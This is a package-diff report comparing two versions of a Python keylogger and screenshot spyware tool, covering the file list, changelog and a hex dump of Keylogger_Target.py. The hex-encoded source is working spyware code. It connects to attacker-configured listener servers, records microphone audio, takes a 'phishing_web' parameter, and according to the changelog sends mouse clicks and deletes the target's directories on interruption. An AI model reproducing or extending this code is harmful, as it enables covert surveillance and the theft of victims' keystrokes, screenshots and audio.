# Comparing `tmp/KeyloggerScreenshot-0.3.1.tar.gz` & `tmp/KeyloggerScreenshot-0.4.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "KeyloggerScreenshot-0.3.1.tar", last modified: Tue Apr 25 22:40:01 2023, max compression
+gzip compressed data, was "KeyloggerScreenshot-0.4.0.tar", last modified: Sun Apr 30 16:03:23 2023, max compression
```

## Comparing `KeyloggerScreenshot-0.3.1.tar` & `KeyloggerScreenshot-0.4.0.tar`

### file list

```diff
@@ -1,31 +1,33 @@
-drwxrwxrwx   0        0        0        0 2023-04-25 22:40:01.810151 KeyloggerScreenshot-0.3.1/
--rw-rw-rw-   0        0        0     3647 2023-04-25 22:39:55.000000 KeyloggerScreenshot-0.3.1/CHANGELOG.txt
--rw-rw-rw-   0        0        0    12113 2023-04-21 17:24:25.000000 KeyloggerScreenshot-0.3.1/KLS_start.py
-drwxrwxrwx   0        0        0        0 2023-04-25 22:40:01.750888 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/
--rw-rw-rw-   0        0        0    12464 2023-04-21 18:17:34.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Keylogger_Target.py
--rw-rw-rw-   0        0        0     1917 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Port_data.py
--rw-rw-rw-   0        0        0     5750 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_keylogger.py
--rw-rw-rw-   0        0        0     2573 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_listener.py
--rw-rw-rw-   0        0        0     3883 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_photos.py
--rw-rw-rw-   0        0        0     1722 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_timer.py
--rw-rw-rw-   0        0        0     6048 2023-04-25 22:36:36.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Simulation_code.py
--rw-rw-rw-   0        0        0      277 2023-04-21 18:13:13.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-25 22:40:01.806070 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/
--rw-rw-rw-   0        0        0     9547 2023-04-25 22:40:01.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      672 2023-04-25 22:40:01.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-25 22:40:01.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       47 2023-04-25 22:40:01.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/requires.txt
--rw-rw-rw-   0        0        0       20 2023-04-25 22:40:01.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.3.1/LISCENCE.txt
--rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.3.1/MANIFEST.in
--rw-rw-rw-   0        0        0     9547 2023-04-25 22:40:01.810151 KeyloggerScreenshot-0.3.1/PKG-INFO
--rw-rw-rw-   0        0        0     5137 2023-04-21 17:24:25.000000 KeyloggerScreenshot-0.3.1/README.md
--rw-rw-rw-   0        0        0     6359 2023-04-25 22:36:36.000000 KeyloggerScreenshot-0.3.1/Simulation_code.py
--rw-rw-rw-   0        0        0      388 2023-03-04 16:59:26.000000 KeyloggerScreenshot-0.3.1/client.py
--rw-rw-rw-   0        0        0      660 2023-04-21 17:48:40.000000 KeyloggerScreenshot-0.3.1/demon_server.py
--rw-rw-rw-   0        0        0    39374 2023-03-14 06:49:49.000000 KeyloggerScreenshot-0.3.1/img_1.png
--rw-rw-rw-   0        0        0      923 2023-03-28 06:01:03.000000 KeyloggerScreenshot-0.3.1/leo_gui.py
--rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.3.1/requirements.py
--rw-rw-rw-   0        0        0       42 2023-04-25 22:40:01.814166 KeyloggerScreenshot-0.3.1/setup.cfg
--rw-rw-rw-   0        0        0     1075 2023-04-25 22:39:55.000000 KeyloggerScreenshot-0.3.1/setup.py
--rw-rw-rw-   0        0        0      175 2023-04-21 17:56:13.000000 KeyloggerScreenshot-0.3.1/target.py
+drwxrwxrwx   0        0        0        0 2023-04-30 16:03:23.064710 KeyloggerScreenshot-0.4.0/
+-rw-rw-rw-   0        0        0     4360 2023-04-30 14:11:18.000000 KeyloggerScreenshot-0.4.0/CHANGELOG.txt
+-rw-rw-rw-   0        0        0    12113 2023-04-21 17:24:25.000000 KeyloggerScreenshot-0.4.0/KLS_start.py
+drwxrwxrwx   0        0        0        0 2023-04-30 16:03:23.011628 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/
+-rw-rw-rw-   0        0        0    14352 2023-04-30 15:00:49.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Keylogger_Target.py
+-rw-rw-rw-   0        0        0     1323 2023-04-30 14:21:53.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Local_Deleter.py
+-rw-rw-rw-   0        0        0     1917 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Port_data.py
+-rw-rw-rw-   0        0        0     6600 2023-04-30 15:49:34.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_keylogger.py
+-rw-rw-rw-   0        0        0     2574 2023-04-30 15:31:41.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_listener.py
+-rw-rw-rw-   0        0        0     3903 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_photos.py
+-rw-rw-rw-   0        0        0     1742 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_timer.py
+-rw-rw-rw-   0        0        0     7151 2023-04-30 12:01:41.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Simulation_code.py
+-rw-rw-rw-   0        0        0      323 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/__init__.py
+drwxrwxrwx   0        0        0        0 2023-04-30 16:03:23.056629 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/
+-rw-rw-rw-   0        0        0    10463 2023-04-30 16:03:22.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      718 2023-04-30 16:03:22.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-30 16:03:22.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       47 2023-04-30 16:03:22.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       20 2023-04-30 16:03:22.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.0/LISCENCE.txt
+-rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.0/MANIFEST.in
+-rw-rw-rw-   0        0        0    10463 2023-04-30 16:03:23.061700 KeyloggerScreenshot-0.4.0/PKG-INFO
+-rw-rw-rw-   0        0        0     5340 2023-04-30 15:00:49.000000 KeyloggerScreenshot-0.4.0/README.md
+-rw-rw-rw-   0        0        0     7182 2023-04-30 13:27:18.000000 KeyloggerScreenshot-0.4.0/Simualation_code.py
+-rw-rw-rw-   0        0        0      388 2023-04-27 07:59:51.000000 KeyloggerScreenshot-0.4.0/client.py
+-rw-rw-rw-   0        0        0      657 2023-04-30 14:26:07.000000 KeyloggerScreenshot-0.4.0/demon_server.py
+-rw-rw-rw-   0        0        0      923 2023-04-27 06:42:15.000000 KeyloggerScreenshot-0.4.0/leo_gui.py
+-rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.4.0/requirements.py
+-rw-rw-rw-   0        0        0       42 2023-04-30 16:03:23.064710 KeyloggerScreenshot-0.4.0/setup.cfg
+-rw-rw-rw-   0        0        0     1075 2023-04-30 14:11:18.000000 KeyloggerScreenshot-0.4.0/setup.py
+-rw-rw-rw-   0        0        0      293 2023-04-30 14:26:07.000000 KeyloggerScreenshot-0.4.0/target.py
+-rw-rw-rw-   0        0        0     1033 2023-04-30 11:23:59.000000 KeyloggerScreenshot-0.4.0/test.py
+-rw-rw-rw-   0        0        0       55 2023-04-30 11:29:13.000000 KeyloggerScreenshot-0.4.0/tester.py
```

### Comparing `KeyloggerScreenshot-0.3.1/CHANGELOG.txt` & `KeyloggerScreenshot-0.4.0/CHANGELOG.txt`

 * *Files 22% similar despite different names*

```diff
@@ -146,8 +146,23 @@
 - Bug fixes
 - New Code on "Simulation_code.py" and on "KLS_Start.py"
 - New files on github https://github.com/Kill0geR/KeyloggerScreenshot
 
 0.3.1 (26/04/2023)
 ---------------------
 - Bug fixes
-- Cleaner Code
+- Cleaner Code
+
+0.4.0 (30/04/2023)
+--------------------
+- Cleaner Code in Simulation_code.py script
+- Directories of the target will be deleted after Keyboard interruption
+- New File on KeyloggerScreenshot Local_Deleter.py + Documentation
+- After Backspace a new list will be shown
+- More intelligent Keylogger (understands when to change the list)
+- Stops the process of images also in linux with PID
+- PID fix on windows
+- duration_in_seconds has been changed to 60 seconds from 200 seconds
+- Mouseclick information will now be sent after Interruption
+- More intelligent Keylogger
+- If backspace is pressed the last pressed character will be deleted from the list
+- Detects if backspace is hold for a long time
```

### Comparing `KeyloggerScreenshot-0.3.1/KLS_start.py` & `KeyloggerScreenshot-0.4.0/KLS_start.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Keylogger_Target.py` & `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Keylogger_Target.py`

 * *Files 3% similar despite different names*

```diff
@@ -9,771 +9,889 @@
 00000080: 2070 7961 7574 6f67 7569 2061 7320 7067   pyautogui as pg
 00000090: 0d0a 696d 706f 7274 206f 730d 0a69 6d70  ..import os..imp
 000000a0: 6f72 7420 7079 6175 6469 6f0d 0a69 6d70  ort pyaudio..imp
 000000b0: 6f72 7420 7468 7265 6164 696e 670d 0a69  ort threading..i
 000000c0: 6d70 6f72 7420 7261 6e64 6f6d 0d0a 696d  mport random..im
 000000d0: 706f 7274 2072 6571 7565 7374 730d 0a69  port requests..i
 000000e0: 6d70 6f72 7420 7765 6262 726f 7773 6572  mport webbrowser
-000000f0: 0d0a 0d0a 0d0a 636c 6173 7320 4b65 796c  ......class Keyl
-00000100: 6f67 6765 7254 6172 6765 743a 0d0a 2020  oggerTarget:..  
-00000110: 2020 6465 6620 5f5f 696e 6974 5f5f 2873    def __init__(s
-00000120: 656c 662c 2069 705f 6f66 5f73 6572 7665  elf, ip_of_serve
-00000130: 725f 7068 6f74 6f73 2c20 706f 7274 5f6f  r_photos, port_o
-00000140: 665f 7365 7276 6572 5f70 686f 746f 732c  f_server_photos,
-00000150: 2069 705f 6f66 5f73 6572 7665 725f 6b65   ip_of_server_ke
-00000160: 796c 6f67 6765 725f 6461 7461 2c0d 0a20  ylogger_data,.. 
-00000170: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00000180: 706f 7274 5f6f 665f 7365 7276 6572 5f6b  port_of_server_k
-00000190: 6579 6c6f 6767 6572 5f64 6174 612c 2069  eylogger_data, i
-000001a0: 705f 6f66 5f73 6572 7665 725f 6c69 7374  p_of_server_list
-000001b0: 656e 6572 2c20 706f 7274 5f6f 665f 7365  ener, port_of_se
-000001c0: 7276 6572 5f6c 6973 7465 6e65 722c 2069  rver_listener, i
-000001d0: 705f 6f66 5f74 696d 6572 2c0d 0a20 2020  p_of_timer,..   
-000001e0: 2020 2020 2020 2020 2020 2020 2020 706f                po
-000001f0: 7274 5f6f 665f 7469 6d65 722c 2064 7572  rt_of_timer, dur
-00000200: 6174 696f 6e5f 696e 5f73 6563 6f6e 6473  ation_in_seconds
-00000210: 3d32 3030 2c20 7068 6973 6869 6e67 5f77  =200, phishing_w
-00000220: 6562 3d4e 6f6e 6529 3a0d 0a20 2020 2020  eb=None):..     
-00000230: 2020 2023 2022 6475 7261 7469 6f6e 5f69     # "duration_i
-00000240: 6e5f 7365 636f 6e64 7322 2074 656c 6c73  n_seconds" tells
-00000250: 2074 6865 2070 726f 6772 616d 6d20 686f   the programm ho
-00000260: 7720 6c6f 6e67 2069 7420 7368 6f75 6c64  w long it should
-00000270: 206c 6173 7420 7468 6520 6465 6661 756c   last the defaul
-00000280: 7420 7469 6d65 2069 7320 3230 3020 7365  t time is 200 se
-00000290: 636f 6e64 7320 7468 6174 2773 2033 204d  conds that's 3 M
-000002a0: 696e 7574 6573 2061 6e64 2032 3020 5365  inutes and 20 Se
-000002b0: 636f 6e64 730d 0a20 2020 2020 2020 2061  conds..        a
-000002c0: 7373 6572 7420 6475 7261 7469 6f6e 5f69  ssert duration_i
-000002d0: 6e5f 7365 636f 6e64 7320 3e3d 2036 302c  n_seconds >= 60,
-000002e0: 2066 227b 6475 7261 7469 6f6e 5f69 6e5f   f"{duration_in_
-000002f0: 7365 636f 6e64 737d 2069 7320 6e6f 7420  seconds} is not 
-00000300: 6772 6561 7465 7220 616e 6420 6e6f 7420  greater and not 
-00000310: 6571 7561 6c20 746f 2036 3022 0d0a 2020  equal to 60"..  
-00000320: 2020 2020 2020 2320 2264 7572 6174 696f        # "duratio
-00000330: 6e5f 696e 5f73 6563 6f6e 6473 2220 7368  n_in_seconds" sh
-00000340: 6f75 6c64 2061 6c77 6179 7320 6265 2062  ould always be b
-00000350: 6967 6765 7220 7468 616e 2036 3020 7365  igger than 60 se
-00000360: 636f 6e64 730d 0a0d 0a20 2020 2020 2020  conds....       
-00000370: 2073 656c 662e 6970 5f70 686f 746f 7320   self.ip_photos 
-00000380: 3d20 6970 5f6f 665f 7365 7276 6572 5f70  = ip_of_server_p
-00000390: 686f 746f 730d 0a20 2020 2020 2020 2073  hotos..        s
-000003a0: 656c 662e 706f 7274 5f70 686f 746f 7320  elf.port_photos 
-000003b0: 3d20 706f 7274 5f6f 665f 7365 7276 6572  = port_of_server
-000003c0: 5f70 686f 746f 730d 0a20 2020 2020 2020  _photos..       
-000003d0: 2073 656c 662e 6970 5f6b 6579 6c6f 6767   self.ip_keylogg
-000003e0: 6572 203d 2069 705f 6f66 5f73 6572 7665  er = ip_of_serve
-000003f0: 725f 6b65 796c 6f67 6765 725f 6461 7461  r_keylogger_data
-00000400: 0d0a 2020 2020 2020 2020 7365 6c66 2e70  ..        self.p
-00000410: 6f72 745f 6b65 796c 6f67 6765 7220 3d20  ort_keylogger = 
-00000420: 706f 7274 5f6f 665f 7365 7276 6572 5f6b  port_of_server_k
-00000430: 6579 6c6f 6767 6572 5f64 6174 610d 0a20  eylogger_data.. 
-00000440: 2020 2020 2020 2073 656c 662e 6970 5f6c         self.ip_l
-00000450: 6973 7465 6e65 7220 3d20 6970 5f6f 665f  istener = ip_of_
-00000460: 7365 7276 6572 5f6c 6973 7465 6e65 720d  server_listener.
-00000470: 0a20 2020 2020 2020 2073 656c 662e 706f  .        self.po
-00000480: 7274 5f6c 6973 7465 6e65 7220 3d20 706f  rt_listener = po
-00000490: 7274 5f6f 665f 7365 7276 6572 5f6c 6973  rt_of_server_lis
-000004a0: 7465 6e65 720d 0a20 2020 2020 2020 2073  tener..        s
-000004b0: 656c 662e 6475 7261 7469 6f6e 203d 2064  elf.duration = d
-000004c0: 7572 6174 696f 6e5f 696e 5f73 6563 6f6e  uration_in_secon
-000004d0: 6473 0d0a 2020 2020 2020 2020 7365 6c66  ds..        self
-000004e0: 2e69 705f 7469 6d65 7220 3d20 6970 5f6f  .ip_timer = ip_o
-000004f0: 665f 7469 6d65 720d 0a20 2020 2020 2020  f_timer..       
-00000500: 2073 656c 662e 706f 7274 5f74 696d 6572   self.port_timer
-00000510: 203d 2070 6f72 745f 6f66 5f74 696d 6572   = port_of_timer
-00000520: 0d0a 2020 2020 2020 2020 7365 6c66 2e70  ..        self.p
-00000530: 6869 7368 696e 6720 3d20 7068 6973 6869  hishing = phishi
-00000540: 6e67 5f77 6562 0d0a 0d0a 2020 2020 2020  ng_web....      
-00000550: 2020 7365 6c66 2e63 6865 636b 203d 205b    self.check = [
-00000560: 5d0d 0a20 2020 2020 2020 2073 656c 662e  ]..        self.
-00000570: 6361 7073 203d 2046 616c 7365 0d0a 2020  caps = False..  
-00000580: 2020 2020 2020 7365 6c66 2e72 6963 6874        self.richt
-00000590: 6967 655f 6c69 7374 6520 3d20 5b5d 0d0a  ige_liste = []..
-000005a0: 2020 2020 2020 2020 7365 6c66 2e63 6f6f          self.coo
-000005b0: 7264 696e 6174 6573 203d 205b 5d0d 0a20  rdinates = [].. 
-000005c0: 2020 2020 2020 2073 656c 662e 776f 7264         self.word
-000005d0: 203d 204e 6f6e 650d 0a0d 0a20 2020 2064   = None....    d
-000005e0: 6566 2064 6174 656e 5f61 7566 6e65 6865  ef daten_aufnehe
-000005f0: 6d65 6e28 7365 6c66 293a 0d0a 2020 2020  men(self):..    
-00000600: 2020 2020 6c69 7374 656e 696e 675f 6461      listening_da
-00000610: 7461 203d 2073 6f63 6b65 742e 736f 636b  ta = socket.sock
-00000620: 6574 2873 6f63 6b65 742e 4146 5f49 4e45  et(socket.AF_INE
-00000630: 542c 2073 6f63 6b65 742e 534f 434b 5f53  T, socket.SOCK_S
-00000640: 5452 4541 4d29 0d0a 2020 2020 2020 2020  TREAM)..        
-00000650: 6c69 7374 656e 696e 675f 6461 7461 2e63  listening_data.c
-00000660: 6f6e 6e65 6374 2828 7365 6c66 2e69 705f  onnect((self.ip_
-00000670: 6c69 7374 656e 6572 2c20 7365 6c66 2e70  listener, self.p
-00000680: 6f72 745f 6c69 7374 656e 6572 2929 0d0a  ort_listener))..
-00000690: 2020 2020 2020 2020 7472 793a 0d0a 2020          try:..  
-000006a0: 2020 2020 2020 2020 2020 666f 726d 6174            format
-000006b0: 203d 2070 7961 7564 696f 2e70 6149 6e74   = pyaudio.paInt
-000006c0: 3136 0d0a 2020 2020 2020 2020 2020 2020  16..            
-000006d0: 6368 616e 6e65 6c73 203d 2032 0d0a 2020  channels = 2..  
-000006e0: 2020 2020 2020 2020 2020 7261 7465 203d            rate =
-000006f0: 2034 3431 3030 0d0a 2020 2020 2020 2020   44100..        
-00000700: 2020 2020 6368 756e 6b20 3d20 3130 3234      chunk = 1024
-00000710: 0d0a 2020 2020 2020 2020 2020 2020 7365  ..            se
-00000720: 636f 6e64 7320 3d20 7365 6c66 2e64 7572  conds = self.dur
-00000730: 6174 696f 6e20 2b20 310d 0a0d 0a20 2020  ation + 1....   
-00000740: 2020 2020 2020 2020 2061 7564 696f 203d           audio =
-00000750: 2070 7961 7564 696f 2e50 7941 7564 696f   pyaudio.PyAudio
-00000760: 2829 0d0a 0d0a 2020 2020 2020 2020 2020  ()....          
-00000770: 2020 2320 7374 6172 7420 5265 636f 7264    # start Record
-00000780: 696e 670d 0a20 2020 2020 2020 2020 2020  ing..           
-00000790: 2073 7472 6561 6d20 3d20 6175 6469 6f2e   stream = audio.
-000007a0: 6f70 656e 2866 6f72 6d61 743d 666f 726d  open(format=form
-000007b0: 6174 2c20 6368 616e 6e65 6c73 3d63 6861  at, channels=cha
-000007c0: 6e6e 656c 732c 0d0a 2020 2020 2020 2020  nnels,..        
-000007d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000007e0: 2020 2020 2020 2020 7261 7465 3d72 6174          rate=rat
-000007f0: 652c 2069 6e70 7574 3d54 7275 652c 0d0a  e, input=True,..
-00000800: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000000f0: 0d0a 696d 706f 7274 2073 6875 7469 6c0d  ..import shutil.
+00000100: 0a66 726f 6d20 6461 7465 7469 6d65 2069  .from datetime i
+00000110: 6d70 6f72 7420 6461 7465 7469 6d65 0d0a  mport datetime..
+00000120: 0d0a 0d0a 636c 6173 7320 4b65 796c 6f67  ....class Keylog
+00000130: 6765 7254 6172 6765 743a 0d0a 2020 2020  gerTarget:..    
+00000140: 6465 6620 5f5f 696e 6974 5f5f 2873 656c  def __init__(sel
+00000150: 662c 2069 705f 6f66 5f73 6572 7665 725f  f, ip_of_server_
+00000160: 7068 6f74 6f73 2c20 706f 7274 5f6f 665f  photos, port_of_
+00000170: 7365 7276 6572 5f70 686f 746f 732c 2069  server_photos, i
+00000180: 705f 6f66 5f73 6572 7665 725f 6b65 796c  p_of_server_keyl
+00000190: 6f67 6765 725f 6461 7461 2c0d 0a20 2020  ogger_data,..   
+000001a0: 2020 2020 2020 2020 2020 2020 2020 706f                po
+000001b0: 7274 5f6f 665f 7365 7276 6572 5f6b 6579  rt_of_server_key
+000001c0: 6c6f 6767 6572 5f64 6174 612c 2069 705f  logger_data, ip_
+000001d0: 6f66 5f73 6572 7665 725f 6c69 7374 656e  of_server_listen
+000001e0: 6572 2c20 706f 7274 5f6f 665f 7365 7276  er, port_of_serv
+000001f0: 6572 5f6c 6973 7465 6e65 722c 2069 705f  er_listener, ip_
+00000200: 6f66 5f74 696d 6572 2c0d 0a20 2020 2020  of_timer,..     
+00000210: 2020 2020 2020 2020 2020 2020 706f 7274              port
+00000220: 5f6f 665f 7469 6d65 722c 2064 7572 6174  _of_timer, durat
+00000230: 696f 6e5f 696e 5f73 6563 6f6e 6473 3d36  ion_in_seconds=6
+00000240: 302c 2070 6869 7368 696e 675f 7765 623d  0, phishing_web=
+00000250: 4e6f 6e65 293a 0d0a 2020 2020 2020 2020  None):..        
+00000260: 2320 2264 7572 6174 696f 6e5f 696e 5f73  # "duration_in_s
+00000270: 6563 6f6e 6473 2220 7465 6c6c 7320 7468  econds" tells th
+00000280: 6520 7072 6f67 7261 6d6d 2068 6f77 206c  e programm how l
+00000290: 6f6e 6720 6974 2073 686f 756c 6420 6c61  ong it should la
+000002a0: 7374 2074 6865 2064 6566 6175 6c74 2074  st the default t
+000002b0: 696d 6520 6973 2032 3030 2073 6563 6f6e  ime is 200 secon
+000002c0: 6473 2074 6861 7427 7320 3320 4d69 6e75  ds that's 3 Minu
+000002d0: 7465 7320 616e 6420 3230 2053 6563 6f6e  tes and 20 Secon
+000002e0: 6473 0d0a 2020 2020 2020 2020 6173 7365  ds..        asse
+000002f0: 7274 2064 7572 6174 696f 6e5f 696e 5f73  rt duration_in_s
+00000300: 6563 6f6e 6473 203e 3d20 3630 2c20 6622  econds >= 60, f"
+00000310: 7b64 7572 6174 696f 6e5f 696e 5f73 6563  {duration_in_sec
+00000320: 6f6e 6473 7d20 6973 206e 6f74 2067 7265  onds} is not gre
+00000330: 6174 6572 2061 6e64 206e 6f74 2065 7175  ater and not equ
+00000340: 616c 2074 6f20 3630 220d 0a20 2020 2020  al to 60"..     
+00000350: 2020 2023 2022 6475 7261 7469 6f6e 5f69     # "duration_i
+00000360: 6e5f 7365 636f 6e64 7322 2073 686f 756c  n_seconds" shoul
+00000370: 6420 616c 7761 7973 2062 6520 6269 6767  d always be bigg
+00000380: 6572 2074 6861 6e20 3630 2073 6563 6f6e  er than 60 secon
+00000390: 6473 0d0a 0d0a 2020 2020 2020 2020 7365  ds....        se
+000003a0: 6c66 2e69 705f 7068 6f74 6f73 203d 2069  lf.ip_photos = i
+000003b0: 705f 6f66 5f73 6572 7665 725f 7068 6f74  p_of_server_phot
+000003c0: 6f73 0d0a 2020 2020 2020 2020 7365 6c66  os..        self
+000003d0: 2e70 6f72 745f 7068 6f74 6f73 203d 2070  .port_photos = p
+000003e0: 6f72 745f 6f66 5f73 6572 7665 725f 7068  ort_of_server_ph
+000003f0: 6f74 6f73 0d0a 2020 2020 2020 2020 7365  otos..        se
+00000400: 6c66 2e69 705f 6b65 796c 6f67 6765 7220  lf.ip_keylogger 
+00000410: 3d20 6970 5f6f 665f 7365 7276 6572 5f6b  = ip_of_server_k
+00000420: 6579 6c6f 6767 6572 5f64 6174 610d 0a20  eylogger_data.. 
+00000430: 2020 2020 2020 2073 656c 662e 706f 7274         self.port
+00000440: 5f6b 6579 6c6f 6767 6572 203d 2070 6f72  _keylogger = por
+00000450: 745f 6f66 5f73 6572 7665 725f 6b65 796c  t_of_server_keyl
+00000460: 6f67 6765 725f 6461 7461 0d0a 2020 2020  ogger_data..    
+00000470: 2020 2020 7365 6c66 2e69 705f 6c69 7374      self.ip_list
+00000480: 656e 6572 203d 2069 705f 6f66 5f73 6572  ener = ip_of_ser
+00000490: 7665 725f 6c69 7374 656e 6572 0d0a 2020  ver_listener..  
+000004a0: 2020 2020 2020 7365 6c66 2e70 6f72 745f        self.port_
+000004b0: 6c69 7374 656e 6572 203d 2070 6f72 745f  listener = port_
+000004c0: 6f66 5f73 6572 7665 725f 6c69 7374 656e  of_server_listen
+000004d0: 6572 0d0a 2020 2020 2020 2020 7365 6c66  er..        self
+000004e0: 2e64 7572 6174 696f 6e20 3d20 6475 7261  .duration = dura
+000004f0: 7469 6f6e 5f69 6e5f 7365 636f 6e64 730d  tion_in_seconds.
+00000500: 0a20 2020 2020 2020 2073 656c 662e 6970  .        self.ip
+00000510: 5f74 696d 6572 203d 2069 705f 6f66 5f74  _timer = ip_of_t
+00000520: 696d 6572 0d0a 2020 2020 2020 2020 7365  imer..        se
+00000530: 6c66 2e70 6f72 745f 7469 6d65 7220 3d20  lf.port_timer = 
+00000540: 706f 7274 5f6f 665f 7469 6d65 720d 0a20  port_of_timer.. 
+00000550: 2020 2020 2020 2073 656c 662e 7068 6973         self.phis
+00000560: 6869 6e67 203d 2070 6869 7368 696e 675f  hing = phishing_
+00000570: 7765 620d 0a0d 0a20 2020 2020 2020 2073  web....        s
+00000580: 656c 662e 6368 6563 6b20 3d20 5b5d 0d0a  elf.check = []..
+00000590: 2020 2020 2020 2020 7365 6c66 2e63 6170          self.cap
+000005a0: 7320 3d20 4661 6c73 650d 0a20 2020 2020  s = False..     
+000005b0: 2020 2073 656c 662e 7269 6368 7469 6765     self.richtige
+000005c0: 5f6c 6973 7465 203d 205b 5d0d 0a20 2020  _liste = []..   
+000005d0: 2020 2020 2073 656c 662e 636f 6f72 6469       self.coordi
+000005e0: 6e61 7465 7320 3d20 5b5d 0d0a 2020 2020  nates = []..    
+000005f0: 2020 2020 7365 6c66 2e77 6f72 6420 3d20      self.word = 
+00000600: 4e6f 6e65 0d0a 2020 2020 2020 2020 7365  None..        se
+00000610: 6c66 2e73 6563 6f6e 6473 203d 205b 5d0d  lf.seconds = [].
+00000620: 0a0d 0a20 2020 2064 6566 2064 6174 656e  ...    def daten
+00000630: 5f61 7566 6e65 6865 6d65 6e28 7365 6c66  _aufnehemen(self
+00000640: 293a 0d0a 2020 2020 2020 2020 6c69 7374  ):..        list
+00000650: 656e 696e 675f 6461 7461 203d 2073 6f63  ening_data = soc
+00000660: 6b65 742e 736f 636b 6574 2873 6f63 6b65  ket.socket(socke
+00000670: 742e 4146 5f49 4e45 542c 2073 6f63 6b65  t.AF_INET, socke
+00000680: 742e 534f 434b 5f53 5452 4541 4d29 0d0a  t.SOCK_STREAM)..
+00000690: 2020 2020 2020 2020 6c69 7374 656e 696e          listenin
+000006a0: 675f 6461 7461 2e63 6f6e 6e65 6374 2828  g_data.connect((
+000006b0: 7365 6c66 2e69 705f 6c69 7374 656e 6572  self.ip_listener
+000006c0: 2c20 7365 6c66 2e70 6f72 745f 6c69 7374  , self.port_list
+000006d0: 656e 6572 2929 0d0a 2020 2020 2020 2020  ener))..        
+000006e0: 7472 793a 0d0a 2020 2020 2020 2020 2020  try:..          
+000006f0: 2020 666f 726d 6174 203d 2070 7961 7564    format = pyaud
+00000700: 696f 2e70 6149 6e74 3136 0d0a 2020 2020  io.paInt16..    
+00000710: 2020 2020 2020 2020 6368 616e 6e65 6c73          channels
+00000720: 203d 2032 0d0a 2020 2020 2020 2020 2020   = 2..          
+00000730: 2020 7261 7465 203d 2034 3431 3030 0d0a    rate = 44100..
+00000740: 2020 2020 2020 2020 2020 2020 6368 756e              chun
+00000750: 6b20 3d20 3130 3234 0d0a 2020 2020 2020  k = 1024..      
+00000760: 2020 2020 2020 7365 636f 6e64 7320 3d20        seconds = 
+00000770: 7365 6c66 2e64 7572 6174 696f 6e20 2b20  self.duration + 
+00000780: 310d 0a0d 0a20 2020 2020 2020 2020 2020  1....           
+00000790: 2061 7564 696f 203d 2070 7961 7564 696f   audio = pyaudio
+000007a0: 2e50 7941 7564 696f 2829 0d0a 0d0a 2020  .PyAudio()....  
+000007b0: 2020 2020 2020 2020 2020 2320 7374 6172            # star
+000007c0: 7420 5265 636f 7264 696e 670d 0a20 2020  t Recording..   
+000007d0: 2020 2020 2020 2020 2073 7472 6561 6d20           stream 
+000007e0: 3d20 6175 6469 6f2e 6f70 656e 2866 6f72  = audio.open(for
+000007f0: 6d61 743d 666f 726d 6174 2c20 6368 616e  mat=format, chan
+00000800: 6e65 6c73 3d63 6861 6e6e 656c 732c 0d0a  nels=channels,..
 00000810: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00000820: 6672 616d 6573 5f70 6572 5f62 7566 6665  frames_per_buffe
